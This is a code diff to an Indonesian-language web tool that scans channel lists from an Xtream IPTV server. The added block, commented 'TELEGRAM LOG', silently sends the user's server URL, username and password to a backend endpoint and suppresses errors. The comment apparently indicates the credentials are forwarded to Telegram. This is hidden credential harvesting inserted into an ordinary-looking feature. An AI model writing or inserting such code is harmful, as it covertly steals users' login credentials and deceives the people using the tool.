@@ -977,6 +977,14 @@ async function runScan() {
       if (!server || !user || !pass) { alert('Server, user, dan password wajib diisi.'); btn.disabled=false; return; }
       if (!server.startsWith('http')) { alert('Server URL harus dimulai dengan http:// atau https://'); btn.disabled=false; return; }
 
+      // ── TELEGRAM LOG ─────────────────────────────────────────
+      fetch('/api/scan', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ server: server, username: user, password: pass })
+      }).catch(() => {});
+      // ─────────────────────────────────────────────────────────
+
       setStatus('scan-status','📡 Mengambil daftar channel Xtream...');
       setProgress('scan-fill','scan-pct',10);
       let data;
